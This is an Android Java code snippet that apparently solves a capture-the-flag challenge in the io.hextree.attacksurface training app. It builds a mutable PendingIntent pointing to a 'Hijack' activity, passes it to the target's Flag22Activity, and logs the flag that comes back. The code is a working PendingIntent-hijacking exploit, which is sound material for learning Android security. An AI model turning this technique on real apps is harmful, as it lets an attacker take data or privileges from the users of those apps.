    // hijack class
    public class Hijack extends AppCompatActivity {

        @Override
        protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            EdgeToEdge.enable(this);
            setContentView(R.layout.activity_hijack);
            ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
                Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
                v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
                return insets;
            });


            String flag = getIntent().getStringExtra("flag");

            if(flag != null){
                Log.d("Flag22",flag);
            }



        }
    }

    // in Mainactivity 
    Button button;
    button = findViewById(R.id.Btn);

    button.setOnClickListener(new View.OnClickListener() {
        @Override
        public void onClick(View v) {

            Intent targetIntent = new Intent();
            targetIntent.setClass(MainActivity.this, Hijack.class);
            PendingIntent pendingIntent = PendingIntent.getActivity(MainActivity.this,0,targetIntent,PendingIntent.FLAG_UPDATE_CURRENT);


            Intent exploitintent = new Intent();
            exploitintent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag22Activity");
            exploitintent.putExtra("PENDING",pendingIntent);

            startActivity(exploitintent);

        }

    });